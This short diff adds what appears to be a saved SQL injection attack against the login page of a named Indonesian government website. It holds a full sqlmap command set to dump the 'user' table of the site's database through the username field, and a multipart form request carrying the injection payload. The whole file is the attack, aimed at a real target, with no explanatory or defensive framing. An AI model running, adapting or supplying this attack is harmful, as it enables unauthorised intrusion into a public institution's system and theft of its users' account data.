@@ -1,0 +1,11 @@
+http://sibkd.semarangkab.go.id:80/sib/module/login.php (POST)  # /usr/bin/sqlmap -r exploit.txt --dbms=mysql --level=2 --risk=2 --random-agent -p username --time-sec=2 --batch --threads=3 -D sib_db -T user --dump
+
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="username"
+
+-1' OR 3*2*1=6 AND 000201=000201 --
+------------YWJkMTQzNDcw
+Content-Disposition: form-data; name="password"
+
+u]H[ww6KrA9F.x-F
+------------YWJkMTQzNDcw--
